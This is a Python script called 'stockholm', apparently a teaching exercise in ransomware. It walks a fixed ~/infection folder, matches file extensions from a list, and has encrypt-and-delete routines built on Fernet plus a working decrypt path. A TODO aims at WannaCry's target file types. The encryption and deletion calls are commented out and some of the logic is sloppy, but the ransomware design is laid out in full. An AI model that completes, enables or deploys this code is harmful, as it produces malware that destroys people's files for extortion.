#!/usr/bin/env python3

# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os
from typing import Any
from pathlib import Path

from cryptography.fernet import Fernet

VERSION = 1.0
TARGET_FOLDER = Path.home().as_posix() + "/infection" 

def get_extentions(path_to_file: str) -> dict:
    d = {}
    with open(path_to_file) as f:
        for line in f:
            d[line.rstrip().split('.')[1]] = line.rstrip()
    return d

# def get_files(path_to_folder: str) -> list[str]:
#     return os.listdir(path_to_folder)

def create_key() -> bytes:
        key = Fernet.generate_key()
        return key

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def write_content_file(path_to_file: str, content: Any):
    with open(path_to_file, 'wb') as file:
        content = file.write(content)
        file.close()

def remove_file(path_to_file: str):
    os.remove(path_to_file)

def encrypt_file(path_to_file: str, key: bytes) -> bytes:
        f = Fernet(key)
        return (f.encrypt(get_content_file(path_to_file)))

def decrypt_file(file_to_decrypt: str, key: bytes) -> bytes:
        f = Fernet(key)
        content_to_decrypt = get_content_file(file_to_decrypt)
        return f.decrypt(content_to_decrypt)

def stockholm(key: bytes, s: bool):
    extentions = get_extentions("extensions.txt")
    # files = get_files(infection_dir)
    for root, subdirs, files in os.walk(TARGET_FOLDER):
        try:
            print(f"New step")
            print(f"ROOT {root}")
            print (f"SUBDIRS {subdirs}")
            
            for file in files:
                if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
                    os.path.join(root,file)
                    # write_content_file(os.path.join(root, file + ".ft"), encrypt_file(os.path.join(root, file), key))
                    # remove_file(os.path.join(root, file))
                if s is True:
                    print(f"Encrypted file {file}")
        except Exception:
            continue

def reverse_stockholm(key: bytes):
    for root, subdirs, files in os.walk(TARGET_FOLDER):
        try:
            for file in files:
                if file.split('.')[-1] == "ft":
                    file_path, ext = os.path.splitext(os.path.join(root, file))
                    write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                    remove_file(os.path.join(root, file))
        except Exception:
            continue



def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-r", "--reverse", type=str, help="reverse the encryption")
    group.add_argument("-k", "--key", type=str, nargs="?", help="use this key for encryption")
    group.add_argument("-v", "--version", action="store_true", help="Show the version of stockholm")
    parser.add_argument("-s", "--silent", action="store_true", help="silence the output")
    args = parser.parse_args()
    try:
        key = None
        if args.version:
            print(f"stockholm version {VERSION}")
            exit(1)
        if args.key is not None:
            key = args.key
        # else:
        #     key = create_key()
            # print(f"The key {key}")
        if args.reverse is None:
            if key is None:
                key = create_key()
                print(f"The key {key}")
            if not args.silent:
                stockholm(key, True)
            else:
                stockholm(key, False)

        if args.reverse is not None:
            reverse_stockholm(bytes(args.reverse, 'utf-8'))
        exit(1)
    except Exception as e:
        print(f"Failed for {e}")


if __name__ == "__main__":
    main()
